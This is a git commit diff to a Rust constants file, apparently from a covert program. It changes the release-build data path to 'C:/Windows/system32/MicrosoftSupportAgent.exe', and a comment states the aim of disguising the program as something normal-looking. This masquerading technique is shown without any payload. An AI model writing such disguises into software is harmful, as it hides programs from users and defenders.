da043e57ccba25515c865bcf5882d656723ca719
noxie64 <gkollegger5@outlook.com>
2026-05-12 16:32:44 +0200

    Forgot to add path on last commit.

--- src/constants.rs
+++ src/constants.rs
@@ -1,6 +1,6 @@
 pub mod paths {
     #[cfg(not(debug_assertions))]
-    pub const DATA: &'static str = "/var/boot_watcher"; // we discuise our self as somthing normal looking
+    pub const DATA: &'static str = "C:/Windows/system32/MicrosoftSupportAgent.exe"; // we discuise our self as somthing normal looking
 
     #[cfg(debug_assertions)]
     pub const DATA: &'static str = concat!(env!("CARGO_MANIFEST_DIR"), "/test_data/simcc_data");
